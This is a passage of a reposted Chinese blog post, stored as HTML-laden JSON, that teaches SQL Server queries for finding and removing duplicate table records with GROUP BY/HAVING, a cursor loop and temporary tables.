#000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果还查性别也相同大则如下:<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">Select</span><span style=\"color: #000000\">&nbsp;Name,sex,</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">From</span><span style=\"color: #000000\">&nbsp;A&nbsp;</span><span style=\"color: #0000ff\">Group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">By</span><span style=\"color: #000000\">&nbsp;Name,sex&nbsp;</span><span style=\"color: #0000ff\">Having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">Count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(三)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法一<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #000000\">integer</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">declare</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">cursor</span><span style=\"color: #000000\">&nbsp;local&nbsp;</span><span style=\"color: #0000ff\">for</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;主字段,</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">；&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">open</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">while</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #008000\">@@fetch_status</span><span style=\"color: #808080\">=</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">begin</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">-</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">delete</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;表名&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;主字段&nbsp;</span><span style=\"color: #808080\">=</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><font face=\"Courier New\"><span style=\"color: #0000ff\">fetch</span><span style=\"color: #000000\">&nbsp;cur_rows&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #008000\">@id</span><span style=\"color: #000000\">,</span><span style=\"color: #008000\">@max</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">end</font></span><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"color: #0000ff\"><font face=\"Courier New\">close</font></span><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;cur_rows<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">set</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">rowcount</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">0</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">方法二<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">　　有两个意义上的重复记录，一是完全重复的记录，也即所有字段均重复的记录，二是部分关键字段重复的记录，比如Name字段重复，而其他字段不一定重复或都重复可以忽略。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></font></span><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、对于第一种重复，比较容易解决，使用<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">就可以得到无重复记录的结果集。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">如果该表需要删除重复的记录（重复记录保留1条），可以按以下方法删除<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">distinct</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;tableName&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">drop</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">table</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#Tmp<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">发生这种重复的原因是表设计不周产生的，增加唯一索引列即可解决。<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"font-weight: bold; color: #800000\">2</span></font><font face=\"Courier New\"><span style=\"color: #000000\">、这类重复问题通常要求保留重复记录中的第一条记录，操作方法如下<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">假设有重复的字段为Name,Address，要求得到这两个字段唯一的结果集<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">identity</span><span style=\"color: #000000\">(</span><span style=\"font-weight: bold; color: #000000\">int</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">,</span><span style=\"font-weight: bold; color: #800000\">1</span><span style=\"color: #000000\">)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID,&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tableName<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">min</span><span style=\"color: #000000\">(autoID)&nbsp;</span><span style=\"color: #0000ff\">as</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">into</span><span style=\"color: #000000\">&nbsp;#Tmp2&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;Name,autoID<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;#Tmp&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #808080\">in</span><span style=\"color: #000000\">(</span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;autoID&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;#tmp2)<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">最后一个select即得到了Name，Address不重复的结果集（但多了一个autoID字段，实际写时可以写在select子句中省去此列）<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">(四)</span></font></div>\n<div><font face=\"Courier New\"><span style=\"color: #000000\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">查询重复<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span><span style=\"color: #000000\">&nbsp;tablename&nbsp;</span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #808080\">in</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;(<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;id&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;tablename&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">group</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">by</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;id&nbsp;<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">having</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #ff00ff\">count</span><span style=\"color: #000000\">(id)&nbsp;</span><span style=\"color: #808080\">&gt;</span><span style=\"color: #000000\">&nbsp;</span><span style=\"font-weight: bold; color: #800000\">1</span></font><span style=\"color: #000000\"><br>\n<font face=\"Courier New\"><img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"><br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\">)</font></span></div>\n</div>","source":"_posts/SQL重复记录查询（转载）.md","raw":"---\ntitle: SQL重复记录查询（转载）\ndate: 2016-10-05 19:34:04\ntags: Sql\ncategories: Sql\n---\n<div id=\"cnblogs_post_body\"><div><span style=\"font-weight: bold; color: #800000\"><font face=\"Courier New\">&nbsp;1</font></span><font face=\"Courier New\"><span style=\"color: #000000\">、查找表中多余的重复记录，重复记录是根据单个字段（peopleId）来判断<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">select</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #808080\">*</span><span style=\"color: #000000\">&nbsp;</span><span style=\"color: #0000ff\">from</span></font><font face=\"Courier New\"><span style=\"color: #000000\">&nbsp;people<br>\n<img onclick=\"window.open(&quot;http://blog.51cto.com/viewpic.php?refimg=&quot; + this.src)\" alt=\"\" src=\"http://images.csdn.net/syntaxhighlighting/OutliningIndicators/None.gif\" align=\"top\"></span><span style=\"color: #0000ff\">where</span><span style=\"color: #000000\">&nbsp;peopleId&nbsp;</span><span 